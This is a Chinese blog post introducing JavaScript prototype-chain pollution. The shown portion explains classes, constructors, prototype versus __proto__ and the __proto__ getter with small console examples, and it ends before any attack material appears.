<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Meteor_Kai">



    <meta name="description" content="Just Hack For Fun...">


    <meta name="keywords" content="Web exploits bring me great joy!">


<title>深入学习JavaScript原型链污染 | Meteor_Kai</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const pagebody = document.getElementsByTagName('body')[0]

            function setTheme(status) {

                if (status === 'dark') {
                    window.sessionStorage.theme = 'dark'
                    pagebody.classList.add('dark-theme');

                } else if (status === 'light') {
                    window.sessionStorage.theme = 'light'
                    pagebody.classList.remove('dark-theme');
                }
            };

            setTheme(window.sessionStorage.theme)
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">Links</a>
                
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">
                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
                </div>
            </div>
            <div class="menu" id="mobile-menu">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.classList.contains("active")) {
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        } else {
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">深入学习JavaScript原型链污染</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">May 9, 2025&nbsp;&nbsp;15:29:54</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="JavaScript类"><a href="#JavaScript类" class="headerlink" title="JavaScript类"></a>JavaScript类</h2><p>下面是一个基本的 JavaScript 类的声明</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">num</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = num</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">applyAdd</span>(<span class="params">op</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> += op</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">applySub</span>(<span class="params">op</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> -= op</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">add</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> num1 + num2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">sub</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> num1 - num2</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们创建类的实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = <span class="keyword">new</span> <span class="title class_">Calculator</span>(<span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc.<span class="property">num</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc.<span class="title function_">applyAdd</span>(<span class="number">2</span>).<span class="property">num</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Calculator</span>.<span class="title function_">sub</span>(<span class="number">11</span>, <span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>运行结果为：1，3，6</p>
<p>基于我们在其它编程语言的习惯，上面的代码非常易于理解</p>
<p>上述代码中，<code>num</code>称为类<code>Calculator</code>的<strong>属性</strong>，<code>applyAdd``applySub</code>称为类<code>Calculator</code>的<strong>方法</strong>，<code>add``sub</code>称为类<code>Calculator</code>的<strong>静态方法</strong></p>
<p>在 ES6 之前，JavaScript 并没有提供 class 语法，类的功能是基于函数（function）来实现的，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Calculator</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">num</span> = num</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Calculator</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">applyAdd</span> = <span class="keyword">function</span> (<span class="params">op</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">num</span> += op</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Calculator</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">applySub</span> = <span class="keyword">function</span> (<span class="params">op</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">num</span> -= op</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Calculator</span>.<span class="property">add</span> = <span class="keyword">function</span> (<span class="params">num1, num2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Calculator</span>.<span class="property">sub</span> = <span class="keyword">function</span> (<span class="params">num1, num2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num1 - num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="keyword">let</span> calc = <span class="keyword">new</span> <span class="title class_">Calculator</span>(<span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc.<span class="property">num</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc.<span class="title function_">applyAdd</span>(<span class="number">2</span>).<span class="property">num</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Calculator</span>.<span class="title function_">sub</span>(<span class="number">11</span>, <span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>现在我们注意下面几个细节</p>
<ul>
<li>用函数实现时，<code>function Calculator</code>的内容（参数、函数体）与用类实现时的<code>constructor</code>相同</li>
<li>用函数实现时，<strong>方法</strong><code>applyAdd</code> <code>applySub</code>声明在<code>Calculator.prototype</code>层中</li>
<li>用函数实现时，<strong>静态方法</strong><code>add</code> <code>sub</code>直接声明在<code>Calculator</code>层中</li>
</ul>
<h2 id="构造器constructor"><a href="#构造器constructor" class="headerlink" title="构造器constructor"></a>构造器constructor</h2><p>刚才的 new 操作完全可以写成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let calc2 = new calc.constructor()</span><br></pre></td></tr></table></figure>

<p>这意味着，创建一个类的含义就是创建了一个<strong>构造器</strong>函数，创建一个实例的含义就是在<strong>继承</strong>的基础上运行了这个构造器函数</p>
<p>为了确保继承过程顺利进行，这个构造器函数必须含有以下特征</p>
<ul>
<li>包含<code>prototype</code>属性</li>
</ul>
<p>而在 JavaScript 中，任意函数都默认具有<code>prototype</code>属性，因此，任意函数都符合一个构造器的标准，任意函数都是一个构造器，可用于生成类实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function TestClass() &#123;&#125;</span><br><span class="line">let test = new TestClass()</span><br></pre></td></tr></table></figure>

<p>以上代码并不会报错</p>
<p>在 JavaScript 中，<strong>继承</strong>这个概念贯彻在许多操作中，每一个新的 JSON 结构的诞生，都进行了类似 new 的逻辑，因此，任何一个对象（除了<code>null</code>）都具有<code>constructor</code>属性，包括构造器本身</p>
<p>构造器本身是一个函数，当我们循环访问<code>constructor</code>时将得到 JavaScript 预定义的构造器<code>Function</code>，而<code>Function</code>的构造器仍然是它本身</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function.constructor === Function</span><br></pre></td></tr></table></figure>

<p>以上表达式将返回<code>true</code></p>
<p>我们可以总结出如下现象</p>
<ul>
<li>构造器链的尽头是<code>Function</code></li>
<li><code>Function</code>的构造器是<code>Function</code>本身</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022113148214.png" alt="image-20241022113148214"></p>
<h2 id="原型和继承"><a href="#原型和继承" class="headerlink" title="原型和继承"></a>原型和继承</h2><p>当我们谈论 JavaScript 的原型，实际上是在谈论对象（JSON 结构）之间的特殊关系，有继承就有原型，有原型就有继承</p>
<p>原型的定义大致可以描述为：<code>A</code>和<code>B</code>是两个 JSON 结构，<code>B</code>继承于<code>A</code>，具有<code>A</code>的全部内容，那么称<code>A</code>就是<code>B</code>的原型</p>
<p>在 JavaScript 中，一个 JSON 结构就可以称为是一个具体的对象，甚至包括<code>Number``String</code></p>
<p><code>null</code>是一个特殊的对象，它表示空，如果把对象之间的继承关系画一个遗传系谱图，那么<code>null</code>就是这张图上最原始的祖先</p>
<p>我们具有构造器函数<code>Calculator</code>，它也是一个 JSON 结构（对象），具有一个属性<code>prototype</code>，我们可以将这个属性理解为创建实例时的“模板”，当创建实例时，实例会<strong>继承</strong>这个“模板”的全部内容</p>
<p>当我们单独说谁是原型时，其实并没有意义，<code>Calculator</code>的<code>prototype</code>不是<code>Calcualtor</code>的原型，而是<code>Calculator</code>所要创建的实例（<code>calc</code>）的原型，事实上，这里命名为<code>prototype</code>（英文译为“原型”）造成了重大的歧义，经常对初学者甚至从业多年的程序员造成巨大困扰，为了方便表述、避免歧义，我们之后将把构造器的<code>prototype</code>称为构造器的“原型模板”</p>
<p>构造器<code>Calculator</code>创建出实例<code>calc</code>后，<code>calc</code>含有一个属性<code>__proto__</code>，这个属性即为<code>calc</code>的原型</p>
<p>刚才我们也提到<code>Calculator.prototype</code>也是<code>calc</code>的原型，所以它们两个是等价的，下面的表达式将返回<code>true</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.__proto__ === Calculator.prototype</span><br></pre></td></tr></table></figure>

<p>当访问<code>calc</code>下的<code>applyAdd</code>，如果<code>calc</code>自己没有<code>applyAdd</code>，则会从它的原型中去查找，从而实现继承</p>
<p>几乎所有 JavaScript 中的对象都有原型，在 JavaScript 中，可以访问任何对象的<code>__proto__</code>属性查看它的原型</p>
<p>另一方面，有原型就有继承，有继承就有相应的构造器，我们可以访问任何对象的<code>constructor</code>属性查看它的构造器</p>
<h2 id="原型对象-prototype-和-proto"><a href="#原型对象-prototype-和-proto" class="headerlink" title="原型对象 prototype 和 __proto__"></a>原型对象 prototype 和 __proto__</h2><p>首先我们需要分辨清楚<code>prototype</code>和<code>__proto__</code>的区别，以<code>Calculator</code>为例，这个构造器函数的原型并不是<code>Calculator.prototype</code>，而是<code>Calculator.__proto__</code>，<code>calc</code>的原型是<code>calc.__proto__</code>等于<code>Calculator.prototype</code></p>
<p>对于这两个原型对象我有两种理解：结合理解最好！</p>
<p>总之，<strong>constuctor</strong>属性和**__proto__**属性都不是被添加上去的，而是继承自构造器的<code>prototype</code>属性</p>
<h3 id="一、出自一位W-M大神"><a href="#一、出自一位W-M大神" class="headerlink" title="一、出自一位W&amp;M大神"></a>一、出自一位W&amp;M大神</h3><p>prototype其实并不能说是”原型”，我认为它是”原型模板”，Calculator使用他的原型模板创建了calc。当我们对原型模板进行改变时，后续创建的新对象自然也会发生改变。</p>
<p>当我们循环访问<code>__proto__</code>时，最终将指向<code>null</code>，而当我们循环访问<code>constructor.prototype</code>时，最终将会给出相同的结果</p>
<p>这是因为一个<strong>构造器</strong>的“原型模板”的构造器就是构造器本身</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Number</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Number</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Object</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Function</span></span><br><span class="line"><span class="title class_">Calculator</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Calculator</span></span><br><span class="line">calc.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === calc.<span class="property">constructor</span></span><br></pre></td></tr></table></figure>

<p>以上表达式都将返回<code>true</code></p>
<p>这种“循环自引用”的逻辑或许会有些难以理解和记忆，但它这么设计是有它的意义所在的</p>
<p>如果我们将<code>prototype</code>的<code>constructor</code>修改成其它的将会发生什么？例如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Calculator</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Number</span></span><br><span class="line"><span class="keyword">let</span> calc = <span class="keyword">new</span> <span class="title class_">Calculator</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们访问<code>calc.constructor</code>，它将返回<code>Number</code>构造器</p>
<p>让我们查看<code>calc</code>的 JSON 结构</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022110932799.png" alt="image-20241022110932799"></p>
<p>因此，<code>calc</code>的<code>contructor</code>属性并不是被添加上去的，而是继承自<code>prototype</code>的，这也说明了为什么一个构造器的<code>prototype.constructor</code>默认指向这个构造器本身</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Calculator 请重新声明以覆盖前面对 prototype.constructor 的修改</span></span><br><span class="line"><span class="keyword">let</span> calc = <span class="keyword">new</span> <span class="title class_">Calculator</span>(<span class="number">1</span>)</span><br><span class="line">calc.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> === calc.<span class="property">__proto__</span></span><br><span class="line">calc.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> === calc.<span class="property">__proto__</span>.<span class="property">__proto__</span></span><br><span class="line">calc.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> === calc.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>

<p>运行结果为true，flase，true</p>
<p>与<code>constructor.prototype</code>不同的是，<code>__proto__</code>将直接指向当前的 JSON 结构继承自哪里</p>
<p>我们检查<code>calc</code>这个对象（JSON 结构）本身的层级是否具有<code>__proto__</code>属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(calc, <span class="string">&#x27;__proto__&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>运行结果为false</p>
<p>可见其实<code>calc</code>本身并不具有<code>__proto__</code>属性</p>
<p>在 JavaScript 中，当我们访问一个对象的<code>A</code>属性，如果当前对象的 JSON 结构中找不到<code>A</code>属性，JavaScript 会从它的原型中去寻找</p>
<p>由于这个特性的存在，如果它的原型（也是一个 JSON 结构）中找不到，会从它的原型的原型中去找，直到原型为<code>null</code>也没有找到则返回<code>undefined</code></p>
<p>接下来我们追溯它的原型</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(calc.<span class="property">__proto__</span>, <span class="string">&#x27;__proto__&#x27;</span>)</span><br><span class="line"><span class="title class_">Object</span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(calc.<span class="property">__proto__</span>.<span class="property">__proto__</span>, <span class="string">&#x27;__proto__&#x27;</span>)</span><br><span class="line"><span class="title class_">Object</span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(calc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>, <span class="string">&#x27;__proto__&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第一行返回了<code>false</code>，<code>calc.__proto__</code>即<code>Calculator.prototype</code>，它的原型的 JSON 结构本身也不具有<code>__proto__</code>属性</p>
<p>第二行返回了<code>true</code>，我们再次打印<code>calc.__proto__.__proto__</code>的结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022111722369.png" alt="image-20241022111722369"></p>
<p>这个结果和<code>Object.prototype</code>一致</p>
<p>我们可以从<code>Object.prototype</code>的 JSON 结构中看到，它含有一个<code>__proto__</code>属性，但是它是一个 Getter，访问<code>__proto__</code>属性将运行这个 Getter 函数，将这个函数的返回值作为<code>__proto__</code>属性的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">所谓 Getter，就是指一个属性的值与一个函数相绑定，访问这个属性，它的值会通过一个函数动态获取，这个函数称为这个属性的 Getter 函数</span><br><span class="line"></span><br><span class="line">相应的，还有 Setter 这一概念，当通过赋值语句`=`对这个属性进行赋值时，实际上是以`=`后面的值为函数的参数调用了它的 Setter 函数</span><br><span class="line"></span><br><span class="line">对于`__proto__`这一 Getter，它的逻辑在 JavaScript 解释器的代码中得到定义，而并不是 JavaScript 语言本身能够定义的</span><br></pre></td></tr></table></figure>

<p>我们可以通过运行如下代码判断一个它是不是一个 Getter</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;__proto__&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022112020163.png" alt="image-20241022112020163"></p>
<p>显然<code>__proto__</code>的值是通过<code>get: __proto__()</code>动态获取的</p>
<p>我们运行<code>Object.getOwnPropertyDescriptor(Object.prototype, &#39;__proto__&#39;).get.call(calc)</code>（意思是以<code>calc</code>为这个 Getter 的 this 指针运行这个 Getter 函数）的结果和<code>cal.__proto__</code>一样</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022112123544.png" alt="image-20241022112123544"></p>
<p>因此，<code>calc</code>中的<code>__proto__</code>实际上是通过 JavaScript 中层层向原型访问的机制寻找到的，它最终通过<strong>原型链</strong>指向了<code>Object.prototype</code>中的<code>__proto__</code>这一带有 Getter 的属性</p>
<p>我们可以通过下面的代码将<code>Object.prototype</code>的<code>__proto__</code>修改为一个确定的、不带有 Getter 的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty(Object.prototype, &#x27;__proto__&#x27;, &#123; value: 123 &#125;)</span><br></pre></td></tr></table></figure>

<p>然后我们会发现众多对象的<code>__proto__</code>都变成了<code>123</code>，包括<code>calc</code>和<code>Calculator.prototype</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022112213500.png" alt="image-20241022112213500"></p>
<h3 id="二、出自p神的博客"><a href="#二、出自p神的博客" class="headerlink" title="二、出自p神的博客"></a>二、出自p神的博客</h3><p>不仅可以把prototype理解为原型模板，也可以将其理解为构造器的属性。</p>
<p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>

<p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p>
<p><strong>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</strong></p>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
